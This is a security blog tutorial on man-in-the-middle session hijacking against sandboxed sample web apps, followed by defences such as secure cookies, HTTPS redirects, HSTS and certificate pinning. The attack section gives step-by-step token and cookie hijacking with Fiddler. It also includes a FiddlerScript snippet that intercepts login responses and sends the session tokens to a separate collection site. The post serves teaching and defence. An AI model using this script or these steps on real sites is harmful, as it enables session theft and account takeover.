---
title: Securing Web Applications Against Man In The Middle Attacks
date: 2016-02-01 00:00:00 Z
categories:
- Tech
author: rsillem
summary: In this post, the causes, effects and mitigations of Man in the Middle attacks
  against web apps are discussed.
layout: default_post
image: "/rsillem/assets/security-mitm/fiddler-1.png"
---

Robin Sillem, William Ferguson

This blog post explores performing man in the middle (MITM) attacks on your own machine, on some pre-made sample web apps. The focus of this post is on securing web apps, rather than the attacks themselves. An important note before starting:

**This blog post shows how to perform an attack on a sandboxed sample website. Attacking targets without prior mutual consent is illegal. It is the reader's responsibility to obey all applicable laws. The writers of this blog post and Scott Logic assume no liability and are not responsible for any misuse or damage caused from the use of this tutorial.**

Session Hijack
-----

A session hijack is where you have a session - an ongoing HTTP conversation - with a website, and an attacker gains access to this session, communicating with the site as if they were you. You may or may not be aware that the attacker is using your session. The session may or may not be authenticated, but it is likely that it is if any sensitive information is involved. This means that the attacker can do what ever you can on the site in question at the time of the hijack - change your password, read your mail, transfer money, whatever. For demonstration purposes though, the object of the attack is to post messages from another user's account without their permission. Something offensive that'll get that user into trouble, perhaps.

A man in the middle (MITM) attack is where the attacker can intercept the network communications between your browser and the server, and read, block or modify it. There are many places this can be done, from malware on your PC to unsecured or compromised wireless networks to unscrupulous ISPs and governments. These events are outside the control of the web app developer or the user. This is the attack vector for the session hijack.

Here's some examples of where man in the middle attacks have been employed successfully.

* [Your PC is compromised](http://www.theregister.co.uk/2015/11/23/dude_youre_getting_pwned)
* [Your router is compromised](http://www.theregister.co.uk/2003/11/07/help_my_belkin_router/)
* [Your wireless network is compromised](http://www.theinquirer.net/inquirer/news/2045528/hundreds-log-rogue-wireless-hotspot-infosec-conference). And the same advice from [Dell](http://powermore.dell.com/technology/hackers-use-wi-fi-steal-passwords/).
* [Your ISP is compromised](http://news.softpedia.com/news/Tunisian-Gov-Is-Primary-Suspect-in-Mass-Theft-of-Gmail-Yahoo-and-Facebook-Logins-176453.shtml)


Getting Started
-----

* Clone the [Sandboxed Containers Repo](https://github.com/WPFerg/SandboxedContainers)
* Install Fiddler [link](http://www.telerik.com/fiddler)
* Create the sample apps (and new databases) with `vagrant up`.  There are two apps, the MEAN stack accessible at `10.10.10.10`, and Jade, Express & MySQL at `10.10.10.20`. These apps have basic user login and post making facilities, inspired by *Write Modern Web Apps with the MEAN Stack* by Jeff Dickey. There's a third site, an 'attacker site' which collects data from the other two apps at `10.10.10.30`.

Find out how your app works, using Fiddler
-----

First, a general discussion of what a session is. HTTP is stateless, meaning that each GET/POST/whatever and its response between a client and a server is independent of the next. Clearly this isn't how it looks to the user, what we conceptualize is a session - an ongoing conversation between you and the site. So some extra plumbing is required, and at a high level of abstraction, this involves there being some additional data being passed back and forth saying 'this HTTP request is part of a specific conversation'. There are many architectures for doing this, and the samples form a small subset of those. The session architecture also encompasses concerns about authentication and how the data is persisted between requests on the client and/or server sides, but for now we're going to ignore that and just worry about how that data is passed.

The first part of the exercise is to look at the architecture/design docs (if there are any - there aren't for these sample apps) and the code, to see how it is supposed to work. If you're looking at something substantial rather than these samples, you should presumably have some idea where the session management bit of code lives and how it works - if you haven't worked on that part, now's a good time to familiarise yourself with it.

The next part of the exercise is to observe the web traffic the app generates, with Fiddler.  Start Fiddler and drive the sample app through a cycle of logging on and submitting a post. Look at all the requests and figure out exactly what information is being passed to maintain the session, and how - what part of the request/response is it?

In the MEAN\_stack sample, it's a JSON Web Token (JWT), passed as the body of the response of the post to `/api/login`, and in the X-Auth request header of (some) subsequent requests. A JWT is an encoded signed bit of data, with a payload generated by the app - in this case, just the username. Copy the string out of Fiddler and take a look, using [http://jwt.io/](http://jwt.io/). Note that it's not encrypted, and it doesn't have anything identifying IP addresses or anything like that. It's just a bearer token - if you're the bearer of the token you've got the session. The signature simply tells the server that it created this token and it hasn't been tampered with.

We know that the MEAN\_stack sample is an AngularJS app, and a glance at the unminified source code using Chrome Dev Tools confirms that. This JS source code **is public** - any user can see it, and the attacker can see that the app gets the token, uses it to get a user from the users API and passes it to the server when submitting a new post. So now have all the information we need to hijack a session in this sample.

In the Jade\_Express\_MySQL sample the information is passed as a cookie, set by the server on any request. The `connect.sid` is a signed ID for the session, but does not contain any data such as the username - that is all stored on the server, looked up using the session ID as a key. Again note that it's not encrypted, and it doesn't have anything identifying IP addresses or anything like that, though the cookie has attributes, which we will discuss later. Again it's just a cookie - if you've got the cookie you've got the session. The signature simply tells the server that it created this cookie and it hasn't been tampered with. FYI the format is `s%3A<ID>.<signature>`. Note that both Chrome and Firefox have extensions for editing cookies, which you should install. The cookie should be something like what's displayed here:

<img src="{{ site.baseurl }}/rsillem/assets/security-mitm/fiddler-2.png" style="display: block; margin: auto;"/>

If you're already somewhat security-aware you may be thinking "This is rubbish - using the same cookie for session ID and (effectively) authentication status." Yes, but for now, it's kept simple.


Run the hijack by hand, using Fiddler
-----

In fact, you've already done the first part of the attack. Fiddler is an HTTP proxy, which is to say a (benign) man in the middle. It's reading the HTTP traffic between client and server. If it was not benign, it might be sending any session IDs it found to (e.g.) an API on the attacker's own site, where they might be decoded and logged. Either way, watch the victim's traffic and extract the session ID (JWT or cookie). In the Jade-Express-MySQL sample use a logged in session for the victim.

The exploits are now trivially simple:

In the MEAN stack sample, using Fiddler capture a valid response to a post to `/api/session`. Save it as a file and paste in the session ID, adjusting the content length to the right number as necessary. Now use the AutoResponder tab in Fiddler to have it send back this response rather than going to the server for an `/api/login` post. Put your attacker hat on, fire up a different browser and login, with no user name or password. You are now logged in as the victim. Post offensive messages at will, and turn the AutoResponder off when you're finished.

<img src="{{ site.baseurl }}/rsillem/assets/security-mitm/fiddler-1.png" style="display: block; margin: auto;"/>

In the Jade-Express-MySQL sample, using the cookie editor extension in a different browser, replace the existing cookie with the one you extracted. You are now logged in as the victim. In fact you actually using the same session on the server in this sample - unlike the MEAN stack sample, where session state is stored in the browser. This means that if the attacker logs out, the victim is logged out too.

You may now be idly considering how to automate this process. But then you'd be writing malware, so don't. This is about how to defend your applications.

Use Fiddler to find unprotected session IDs
-----
We can do some basic filtering using Fiddler's Filters tab - for instance we can set a filter to flag (highlight) either requests which send the `X-Auth` header or any 200 status response received from `/api/login`, meaning the authentication process was successful.

Now put this together to customise Fiddler so it shows if any session ID tokens/cookies are sent over HTTP for either of the samples - you should now have a detailed understanding of exactly what you want to catch on each sample app. This will be the basis of our testing - you will just run the apps with Fiddler capturing HTTP requests and flagging the bad ones.

As a further exercise, we can use the Attacker\_site sample with some additional Fiddler rules. The attacker site is a very simple site which collects and displays on screen any data which is sent to its `/api/logs` endpoint as a query parameter on a GET request. The attacker sets this website up, then sits back and watches your secrets roll in. Let's set it up to intercept the session tokens as they are sent back from the server.

Using [FiddlerScript](http://docs.telerik.com/fiddler/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse) for more details:

* Open the FiddlerRules files: Click Rules => Customized Rules... (or press Ctrl+R)
* Go to the method `static function OnBeforeResponse(oSession: Session)`  - or create one if needed
* Type the following to catch any authentication response:
```
    if (oSession.HostnameIs("10.10.10.10") && oSession.uriContains("/api/login") && oSession.responseCode == 200){
        var origin = oSession.url;
        var type = "[SESSION]";
        var value = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);
        var queryString = System.String.Format("origin={0}&type={1}&value={2}", origin, type, value);
        Handlers.HTTPGet("http://10.10.10.30/api/logs/add",queryString);
    }
```

* Add an extra method to allow sending HTTP requests:
```
    public static function HTTPGet(Url:System.String, Data:System.String):System.String
    {
        var Out = String.Empty;
        var req = System.Net.WebRequest.Create(Url + (System.String.IsNullOrEmpty(Data) ? "" : "?" + Data));

        try{
            var resp = req.GetResponse();
            var stream = resp.GetResponseStream();

            var sr = new System.IO.StreamReader(stream);

            Out = sr.ReadToEnd();
            sr.Close();
            stream.Close();
        }
        catch(e){ Out = e.ToString();            
            FiddlerObject.alert(Out);
        }
        return Out;
    }
```

The script above will first intercept any successful authentication response from the targeted server (`oSession.HostnameIs("10.10.10.10") && oSession.uriContains("/api/login") && oSession.responseCode == 200`).
When this happens, the authentication token will be collected from the response (`System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes)`) and sent to the attacker website in charge of collecting stolen information (`Handlers.HTTPGet("http://10.10.10.30/api/logs/add",queryString)`).

Log in, and then visit `10.10.10.30`. Hopefully, this is the sort of thing you'd see:

<img src="{{ site.baseurl }}/rsillem/assets/security-mitm/fiddlerscript.png" style="display: block; margin: auto;"/>

See how the samples behave with HTTPS
-----

Before starting this exercise, make sure that Fiddler is NOT capturing HTTPS requests, then close it down.

The basic failing we're addressing is that sensitive data is being passed using HTTP. HTTP gives us no confidence that the sensitive data has not been intercepted or tampered with, or indeed that we are actually talking to the right host. Those are the things that HTTPS provides, and happily the sample apps do support HTTPS, in a flawed way, as you'd expect.

Now is the time to make sure you have a firm grasp of what HTTPS is, and how (to a superficial level at least) it works. This should include an understanding of the handshake process, what certificates are, and how they are used and trust established.

These links might prove useful:

* [Wikipedia article on HTTPS](https://en.wikipedia.org/wiki/HTTPS)

* [Description of Transport Layer Security](https://en.wikipedia.org/wiki/Transport_Layer_Security#Description)

* [Wikipedia on Public Key Certificates](https://en.wikipedia.org/wiki/Public_key_certificate)

The sample apps use self-signed certificates for the domains `10.10.10.10` and `10.10.10.20` respectively. These are not trusted by your browser, as there is no chain of trust back to a trusted root certification authority (they do have a public key, so they enable the confidentiality/integrity bits of HTTPS). If you request either sample in a modern browser it will complain at you about untrusted connections. So now you should arrange matters so that the certificates provided by the samples are trusted, and at this point I should reiterate that you should have a firm grasp of what certificates and trust are about.

If you were foolish enough to trust these certificates then you might go right ahead and tell your browser to trust them. If you're more paranoid (you should be) find out how to create your own, keep them private and trust those ones - and either keep the .pem file names the same, or tweak the `server.js` code. Look at it this way: the sample apps are already compromised, because the private keys - the *-key.pem files - are published.

Here are 2 **really bad** things the samples do that you should ensure that you do not do in a production system:

1. They use self-signed certificates
2. They allow public access to their private keys

So with that dire warning fully understood, set both samples up with trusted certificates. N.B. Chrome and IE use the Windows certificate store, Firefox is different. Work through however many iterations of try/fail it takes to get the https versions of both apps up without the browser complaining.

Now you can start up Fiddler again. Login and you will see nothing in Fiddler *until you hit the Register page*, because all your traffic is over HTTPS and Fiddler isn't capturing that. Unfortunately, owing to a (deliberate) oversight, the Register page is hard-coded to be HTTP. All of a sudden you're out of the secure world, Fiddler (or the MITM malware, remember) is seeing your traffic, and in the Jade-Express-MySQL sample you'll see Fiddler highlighting the traffic with exposed session cookies. You'll see something similar in the MEAN\_stack sample if you're logged in. In any event, you can still browse the samples with HTTP


Secure cookies
-----

Building secure apps is all about defence in depth - putting in many layers of defence. These layers may overlap and appear redundant because of other defences, but the idea is that if an attacker gets through one layer he hasn't breached the whole thing. So we'll start by applying a simple (and insufficient) fix for the session cookies - this is for the Jade-Express-MySQL sample.

Find where the cookies are specified, in `server.js`, and force them to be secure. This means they will only be transported via a secure transport protocol. Now click around on the sample app and watch the traffic with Fiddler. Nothing has changed! That's because the way cookies work is that they are stored by the browser and sent automatically with requests to the domain they are associated with, and the browser still has the old cookie. Go into the browser dev tools, delete the `connect.sid` cookie for the 10.10.10.20 site and try logging in.

It seems to work, but you're clearly not logged in - you don't see your name and you can't add new posts. Basically you've broken it - you were using HTTP and you told it not to transport cookies over HTTP so you haven't got the cookie and the server can't tie your requests to any particular session. Fiddler will still complain about the password appearing in plain text, too.

So we need to stop the system from using HTTP. One rather brutal way would be to stop the server listening to HTTP traffic altogether. However, this is going to be a very bad user experience for anyone navigating to the site with an HTTP URL - the connection will fail altogether.

A better approach would be to have the server redirect HTTP requests to the HTTPS equivalent. A quick way to do this to the sample apps is to use the `express-sslify` module (no doubt there are others too). Take a look at the source to see what it is actually doing, then put it in and try again. You'll see that all your HTTPs become HTTPSs, including the 'accidentally' hard coded URL for Register. It will also pretty much disappear from the Fiddler display, unless you have Fiddler capturing HTTPS.

Note that this quick fix is pretty minimal. We haven't considered anything about exactly what protocols we are using, for instance, and the subject is a lot more complex than the simplistic HTTP vs HTTPS concept. For instance, see [https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack](https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack).

It's important to realise what the redirect does. If the client sends an HTTP request, then the server sends a 301 response and the client makes the equivalent HTTPS request. So if sensitive data is exposed in the original request it will be visible to an attacker. Try putting the cookie secure attribute back to false, logging in, and then accessing the site over HTTP. Fiddler will complain about the exposed session cookie. So you need both - put it back to secure.

Obviously in this simple case we have done an across-the board redirect of all GETs, (and outright rejection (403) of POSTs), so things are relatively simple.

Some web apps work over a mixture of HTTP and HTTPS. Be very careful in these situations. The classic example is that of a login page served to an HTTP request. At first sight, there's no sensitive data here (assuming session ID is handled separately from authentication state). It's just a form and the credentials will be sent with a secure POST. The HTML response to the request for the login page is not secured in transit and so is vulnerable to MITM tampering - the attacker can inject script into the login page that sends your keystrokes to his site, thus stealing credentials. Be very careful here, and consider having the entire application go over HTTPS unless there's a good reason why not.

Secure tokens
-----

On the face of it, you might consider making those API calls only respond to HTTPS requests, so that the JWTs are always protected in transit. However, you still face the issue of browsers making HTTP requests - the Javascript source code is out of your control when it's on a browser. If the JWT is passed in an HTTP request, it's vulnerable regardless of whether the request succeeds, fails or is redirected.

How might this happen, though? If your machine or browser is compromised, you've lost control of the situation - the token may be exposed without being sent anywhere in your application. If your app has an XSS (cross-site scripting) flaw, the transport protocol is also irrelevant.

In this kind of app your **client-side source code is public** (minification is not a security feature). An attacker can read it without any form of exploit, just by accessing your site. If they can access and tamper with it (including HTML templates, CSS, everything) on its way from the server to the client, they can make it do absolutely anything they want, including making HTTP requests to your API, which then are silently redirected to HTTPS. So all of this **must be transported securely**.

Make the same changes to the MEAN\_stack app that you did to the Jade\_Express\_MySQL app, adding the `express-sslify` middleware. Now set up Fiddler to capture and decrypt HTTPS traffic (you may need to restart Fiddler). Log in and add a post. You should see the POST to `/api/posts` returning a 201. Open up the Composer tab in fiddler and drag that request over into it. Change the URL to be http and execute (this is an easy way to simulate compromised client code issuing the HTTP request to the API, don't worry about exactly how Fiddler is getting at that request for now ;-) ). You will see the request gets rejected with a 403 as expected, but Fiddler is complaining that the session token is exposed. Bingo, you've hacked yourself again. This is why you serve your assets securely, though we will discuss other mitigations below.


Preventing the browser from using HTTP - HSTS
-----

Much of the discussion above revolves around the fact that the browser can make HTTP requests, even if they are rejected or redirected. This can be addressed by using the Strict-Transport-Security response header (HSTS). This does two things:

1. Tells the browser to only make requests to your site using secure protocols
2. Tells the browser not to let the user access the site if the certificate is not trusted

There are a couple of caveats here:

1. It's not supported by all browsers. See [http://caniuse.com/#search=HSTS](http://caniuse.com/#search=HSTS)
2. It's a trust on first use thing. You don't get the header until you make your first request. There are ways of preloading this header, however.

Implement HSTS on the sample apps and have a play around with it. This is easily said, and less easily done, but it will force you through a whole bunch of the practicalities. In principle all you need to do is to get the server to return the Strict-Transport-Security header with some appropriate options, and the browser will thereafter know that the site uses HSTS and not sent HTTP requests. In practice I found I needed to change the domain name from 10.10.10.xx to some other domain name (I used jade_express_mysql.com - I've no idea why I had to do this but it worked). Another tip is if things don't seem to be working as you expect, take a new tab in chrome and try again. For this, the Chrome dev tools network tab is the weapon of choice - Fiddler gets in the way rather, so close it down.

<img src="{{ site.baseurl }}/rsillem/assets/security-mitm/net-internals.png" style="display: block; margin: auto;"/>

You will also find [chrome://net-internals/#hsts](chrome://net-internals/#hsts) very handy for examining and flattening chrome's knowledge of settings for the domain name. See above for an example of the headers Chrome has stored for Strict-Transport-Security and Public-Key-Pinning.


You will know if you have got everything right if:

* The app is working with HTTPS, with a trusted certificate
* If you go into [chrome://net-internals/#hsts](chrome://net-internals/#hsts) and delete your domain, then fire up the HTTP (not HTTPS) in a new tab, you will see it go to the server for the HTTP version, then redirect you (301) to the HTTPS version (200)
* You can then check [chrome://net-internals/#hsts](chrome://net-internals/#hsts) again and query your domain to see the current HSTS set
* You can then hit the HTTP URL again and this time and see the redirect is a 307, with no actual server round trip. This illustrates the trust on first use issue - there is one HTTP request, unless your site is on Google's browser preload list


Another thing you will observe is that you can no longer get in if Fiddler is capturing HTTPS. This is because Fiddler works by inserting itself as a proxy with its own certificate - DO\_NOT\_TRUST\_FiddlerRoot (there's a clue in the name). Where you could previously click past the browser warnings, once you have HSTS in place you can't - unless you're using IE <= 10.

You can see more information about Strict Transport Security at [Wikipedia](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security) or [OWASP](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security).


Restricting which certificates the app trusts - HPKP
-----

HSTS stops the user going further if the certificate is not trusted, but it doesn't cover the case where an attacker is presenting a certificate that is trusted. There have been several high profile examples of this. Basically, you can't trust a trusted certification authority, which somewhat drives a truck through the whole concept.

Certificate and public key pinning provides an answer to this. It's another response header (Public-Key-Pins), and native mobile apps can implement the behaviour in code. It basically tells the browser only to accept certificates with particular attributes - e.g. a hash.

There are a couple of caveats here:

1. It's not supported by all browsers. See [http://caniuse.com/#search=HPKP](http://caniuse.com/#search=HPKP)
2. It's a trust on first use thing. You don't get the header until you make your first request. There are ways of preloading this header, but this definitely comes under the heading of 'further reading'
3. THE BIG ONE. It's an operational headache. Certificates expire and get revoked, so you need multiple pins. If all your pinned certificates become unusable, your users can't get to your site to get new ones. If they're very savvy they can get into their browser settings and un-pin themselves, but most likely you've just denial of serviced yourself. Oops.

The OWASP guidance below is quite gung-ho about HPKP, but that guidance is under review and likely to change because of #3 above. There are some large organisations moving away from its use. Try it on the samples if you like - I haven't.

See further:

* [https://en.wikipedia.org/wiki/HTTP\_Public\_Key\_Pinning](https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning)
* [https://www.owasp.org/index.php/Pinning\_Cheat\_Sheet](https://www.owasp.org/index.php/Pinning_Cheat_Sheet)



What about websockets?
-----

The MEAN\_stack sample app has a feature to push incoming posts out to all clients via websockets (see [https://en.wikipedia.org/wiki/WebSocket](https://en.wikipedia.org/wiki/WebSocket) ). Web socket traffic can be intercepted like any other traffic - it's a little more convoluted and I've had to disable the payload compression for clarity, but you'll find some Fiddler rules to display it in the Resources folder.  

Like HTTP/HTTPS there are insecure and secure variants of the websockets protocol (`ws://` and `wss://`). The sample makes the client pick one of these to match the HTTP/S protocol it's using -  a debatable decision, and you may want to secure this completely too. In fact, there's nothing very sensitive in the payload in this app, but using wss:// will make the traffic disappear from Fiddler's (HTTP-only) display.

Of course, this is one-way server->client traffic in this app. If you are also using client->server websockets traffic you will of course need to secure that too. In this case you may well have more sensitive data, especially as your design may also require you to send a JWT as part of each message payload, as you do for HTTP/S API requests.


The End
-----

This was a fairly in-depth (but also relatively brief) overview of how to prevent Man in the Middle attacks. The main take-away is trying to keep as much of a web app using secure transport protocols as possible. To see how light a skim all the above actually was, take a look at the [OWASP transport layer protection cheat sheet](https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet) .
